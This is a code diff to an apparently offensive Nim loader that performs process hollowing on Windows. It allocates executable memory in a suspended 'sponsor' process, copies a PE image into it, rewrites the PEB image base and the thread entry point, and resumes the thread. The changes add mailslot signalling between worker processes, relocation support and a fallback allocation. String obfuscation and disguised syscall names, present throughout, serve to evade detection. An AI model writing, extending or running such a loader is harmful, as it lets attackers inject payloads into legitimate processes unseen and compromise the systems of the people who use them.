@@ -2,6 +2,7 @@ import os
 import winim
 import strutils
 import ptr_math
+import mailslot
 import nimprotect
 include reloc
 
@@ -11,34 +12,53 @@ include reloc
 # Thread context    -> -T:<sponsor-thread-handle> -N:<new-base-address>
 # Resume            -> -R:<sponsor-thread-handle>
 
+const allocatedAddressMailSlot = protectString("\\\\.\\mailslot\\phaa")
+
+
 when defined(hollow4):
 
     proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
-    proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
+    # proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
     proc NtGetContextThread(ThreadHandle : HANDLE, Context : PCONTEXT): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
     proc NtSetContextThread(ThreadHandle : HANDLE, Context : PCONTEXT): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
     proc NtResumeThread(ThreadHandle: HANDLE, SuspendCount: PULONG): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
 
     proc allocateMemoryProcess(
         processHandle: Handle, 
-        peImageImageBase: ptr PVOID, 
-        peImageSize: ptr size_t
+        peImageImageBase: PVOID, 
+        peImageSize: size_t
     ) =
+        var newImageBaseAddress = peImageImageBase
         if NtAllocateVirtualMemory(
             processHandle,
-            peImageImageBase,
+            addr newImageBaseAddress,
             0,
-            peImageSize,
+            unsafeAddr peImageSize,
             MEM_COMMIT or MEM_RESERVE,
             PAGE_EXECUTE_READWRITE
         ) != 0:
+            newImageBaseAddress = NULL
+            if NtAllocateVirtualMemory(
+                processHandle,
+                addr newImageBaseAddress,
+                0,
+                unsafeAddr peImageSize,
+                MEM_COMMIT or MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+            ) != 0:
+                quit(1)
+        
+        # Write to the mailslot
+        if not writeMailslot(allocatedAddressMailSlot, $cast[int](newImageBaseAddress)):
             quit(1)
-        else:
-            quit(0)
+        
+        # success
+        quit(0)
 
 
     proc writeMemoryProcess(
         processHandle: Handle,
+        newImageBase: PVOID,
         peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
         peImageImageBase: PVOID, 
         peBytesPtr: ptr byte, 
@@ -64,19 +84,18 @@ when defined(hollow4):
         # Copy PE headers to sponsor process
         if NtWriteVirtualMemory(
             processHandle,
-            peImageImageBase,
+            newImageBase,
             peBytesPtr,
             peImageSizeOfHeaders,
             NULL
         ) != 0: 
             quit(1)
-        
 
         # Copy PE sections to sponsor process  
         for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
             if NtWriteVirtualMemory(
                 processHandle,
-                peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
+                newImageBase + peImageSectionsHeader[i].VirtualAddress,
                 peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
                 peImageSectionsHeader[i].SizeOfRawData,
                 NULL
@@ -87,19 +106,23 @@ when defined(hollow4):
         if NtWriteVirtualMemory(
             processHandle,
             cast[LPVOID](cast[int](sponsorPeb) + 0x10),
-            unsafeAddr peImageImageBase,
+            unsafeAddr newImageBase,
             cast[size_t](sizeof(PVOID)),
             NULL
         ) != 0:
             quit(1)
 
+        # Apply relocations
+        if not applyRelocations(peBytesPtr, newImageBase, processHandle):
+            quit(1)
+        
         # success
         quit(0)
 
 
     proc setThreadProcess(
         threadHandle: Handle,
-        peImageImageBase: PVOID,
+        newImageBase: PVOID,
         peImageEntryPoint: PVOID
     ) =
         var context: CONTEXT
@@ -109,7 +132,7 @@ when defined(hollow4):
             addr context
         ) != 0:
             quit(1)
-        var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
+        var entryPoint = cast[DWORD64](newImageBase) + cast[DWORD64](peImageEntryPoint)
         context.Rcx = cast[DWORD64](entryPoint)
         if NtSetContextThread( 
             threadHandle, 
@@ -128,6 +151,7 @@ when defined(hollow4):
             NULL
         ) != 0:
             quit(1)
+        
         # success
         quit(0)
 
@@ -136,24 +160,40 @@ when defined(hollow5) or defined(hollow6):
 
     proc allocateMemoryProcess(
         processHandle: Handle, 
-        peImageImageBase: ptr PVOID, 
-        peImageSize: ptr size_t
+        peImageImageBase: PVOID, 
+        peImageSize: size_t
     ) =
+        var newImageBaseAddress = peImageImageBase
         if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
             processHandle,
-            peImageImageBase,
+            addr newImageBaseAddress,
             0,
-            peImageSize,
+            unsafeAddr peImageSize,
             MEM_COMMIT or MEM_RESERVE,
             PAGE_EXECUTE_READWRITE
         ) != 0:
+            newImageBaseAddress = NULL
+            if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
+                processHandle,
+                addr newImageBaseAddress,
+                0,
+                unsafeAddr peImageSize,
+                MEM_COMMIT or MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+            ) != 0:
+                quit(1)
+        
+        # Write to the mailslot
+        if not writeMailslot(allocatedAddressMailSlot, $cast[int](newImageBaseAddress)):
             quit(1)
-        else:
-            quit(0)
+        
+        # success
+        quit(0)
 
 
     proc writeMemoryProcess(
         processHandle: Handle,
+        newImageBase: PVOID,
         peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
         peImageImageBase: PVOID, 
         peBytesPtr: ptr byte, 
@@ -164,7 +204,6 @@ when defined(hollow5) or defined(hollow6):
         # Get remote PEB address
         var bi: PROCESS_BASIC_INFORMATION
         var ret: DWORD
-        
         if NtQueryInformationProcess(
             processHandle,
             0,
@@ -179,19 +218,18 @@ when defined(hollow5) or defined(hollow6):
         # Copy PE headers to sponsor process
         if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
             processHandle,
-            peImageImageBase,
+            newImageBase,
             peBytesPtr,
             peImageSizeOfHeaders,
             NULL
         ) != 0: 
             quit(1)
         
-
         # Copy PE sections to sponsor process  
         for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
             if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
                 processHandle,
-                peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
+                newImageBase + peImageSectionsHeader[i].VirtualAddress,
                 peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
                 peImageSectionsHeader[i].SizeOfRawData,
                 NULL
@@ -202,19 +240,19 @@ when defined(hollow5) or defined(hollow6):
         if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
             processHandle,
             cast[LPVOID](cast[int](sponsorPeb) + 0x10),
-            unsafeAddr peImageImageBase,
+            unsafeAddr newImageBase,
             cast[size_t](sizeof(PVOID)),
             NULL
         ) != 0:
             quit(1)
-
+        
         # success
         quit(0)
 
 
     proc setThreadProcess(
         threadHandle: Handle,
-        peImageImageBase: PVOID,
+        newImageBase: PVOID,
         peImageEntryPoint: PVOID
     ) =
         var context: CONTEXT
@@ -224,13 +262,14 @@ when defined(hollow5) or defined(hollow6):
             addr context
         ) != 0:
             quit(1)
-        var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
+        var entryPoint = cast[DWORD64](newImageBase) + cast[DWORD64](peImageEntryPoint)
         context.Rcx = cast[DWORD64](entryPoint)
         if IGyhziwCULdezDSq( # NtSetContextThread
             threadHandle, 
             addr context
         ) != 0:
             quit(1)
+        
         # success        
         quit(0)
 
@@ -243,13 +282,14 @@ when defined(hollow5) or defined(hollow6):
             NULL
         ) != 0:
             quit(1)
+        
         # success
         quit(0)
 
    
 proc createProcessWorker(arg: string): PPROCESS_INFORMATION =
 
-    var processCmd = getAppFilename() & " " & arg
+    var processCmd = getAppFilename() & arg
     
     # Supply RC4 key if needed
     for i in commandLineParams():
@@ -276,51 +316,6 @@ proc createProcessWorker(arg: string): PPROCESS_INFORMATION =
     return addr pi
 
 
-proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase: PVOID): bool =
-    
-    # Vars to check childen processes
-    var res: DWORD
-    var ppi: PPROCESS_INFORMATION
-
-    # Allocate memory in sponsor process
-    when not defined(release): echo "[*] Allocating memory in sponsor process"     
-    ppi = createProcessWorker(protectString("-A:") & $sponsorProcessHandle)
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
-    discard GetExitCodeProcess(ppi.hProcess, addr res)
-    if res != 0:
-        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
-        quit(1)
-
-    when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
-
-    # Copy PE to sponsor process 
-    when not defined(release): echo "[*] Copying PE to sponsor process"
-    ppi = createProcessWorker(protectString("-W:") & $sponsorProcessHandle)
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
-    discard GetExitCodeProcess(ppi.hProcess, addr res)
-    if res != 0:
-        when not defined(release): echo "[-] Could not write to sponsor process"
-        quit(1)
-
-    # Change sponsor thread Entrypoint
-    when not defined(release): echo "[*] Changing thread context"
-    ppi = createProcessWorker(protectString("-T:") & $sponsorThreadHandle)
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
-    discard GetExitCodeProcess(ppi.hProcess, addr res)
-    if res != 0:
-        when not defined(release): echo "[-] Could not change thread context"
-        quit(1)
-
-    # Resume remote thread 
-    when not defined(release): echo "[*] Resuming thread"
-    ppi = createProcessWorker(protectString("-R:") & $sponsorThreadHandle)
-    WaitForSingleObject(ppi.hProcess, 3 * 1000)
-    discard GetExitCodeProcess(ppi.hProcess, addr res)
-    if res != 0:
-        when not defined(release): echo "[-] Could not resume thread"
-        quit(1)
-
-
 proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
     
     # Extract process information
@@ -338,7 +333,54 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
     var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     
-    discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
+    # Vars to check children processes
+    var res: DWORD
+    var ppi: PPROCESS_INFORMATION
+
+    # Create a mailslot
+    let mailslotHandle = createMailslot(allocatedAddressMailSlot)
+    if mailslotHandle == 0:
+        quit(1)
+
+    # Allocate memory in sponsor process
+    when not defined(release): echo "[*] Allocating memory in sponsor process"     
+    ppi = createProcessWorker(protectString(" -A:") & $sponsorProcessHandle)
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
+        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
+        quit(1)
+
+    # Get the allocated address from the allocator process
+    let newImageBaseAddress = cast[PVOID](parseInt(readMailslot(mailslotHandle)))
+    when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
+
+    # Copy PE to sponsor process 
+    when not defined(release): echo "[*] Copying PE to sponsor process"
+    ppi = createProcessWorker(protectString(" -W:") & $sponsorProcessHandle & protectString(" -N:") & $cast[int](newImageBaseAddress))
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
+        when not defined(release): echo "[-] Could not write to sponsor process"
+        quit(1)
+
+    # Change sponsor thread Entrypoint
+    when not defined(release): echo "[*] Changing thread context"
+    ppi = createProcessWorker(protectString(" -T:") & $sponsorThreadHandle & protectString(" -N:") & $cast[int](newImageBaseAddress))
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
+        when not defined(release): echo "[-] Could not change thread context"
+        quit(1)
+
+    # Resume remote thread 
+    when not defined(release): echo "[*] Resuming thread"
+    ppi = createProcessWorker(protectString(" -R:") & $sponsorThreadHandle)
+    WaitForSingleObject(ppi.hProcess, 3 * 1000)
+    discard GetExitCodeProcess(ppi.hProcess, addr res)
+    if res != 0:
+        when not defined(release): echo "[-] Could not resume thread"
+        quit(1)
 
  
 proc hollow456Worker*(peStr: string): bool =
@@ -356,18 +398,23 @@ proc hollow456Worker*(peStr: string): bool =
     
     # Extract process parameters
     let commandLineParams = commandLineParams()
-
-    # Parse command line args
+    
+    # Parse command line args and call to worker functions
+    var newImageBase: PVOID
+    for i in commandLineParams:
+        if i.startsWith(protectString("-N:")):
+            newImageBase = cast[PVOID](parseInt(i.replace(protectString("-N:"), "")))
     for i in commandLineParams:
         if i.startsWith(protectString("-A:")):
             allocateMemoryProcess(
                 parseInt(i.replace(protectString("-A:"), "")), 
-                addr peImageImageBase, 
-                addr peImageSize
+                peImageImageBase, 
+                peImageSize
             )
         elif i.startsWith(protectString("-W:")):
             writeMemoryProcess(
-                parseInt(i.replace(protectString("-W:"), "")), 
+                parseInt(i.replace(protectString("-W:"), "")),
+                newImageBase,
                 peImageNtHeaders, 
                 peImageImageBase, 
                 peBytesPtr, 
@@ -377,7 +424,7 @@ proc hollow456Worker*(peStr: string): bool =
         elif i.startsWith(protectString("-T:")):
             setThreadProcess(
                 parseInt(i.replace(protectString("-T:"), "")),
-                peImageImageBase,
+                newImageBase,
                 peImageEntryPoint
             )
         elif i.startsWith(protectString("-R:")):
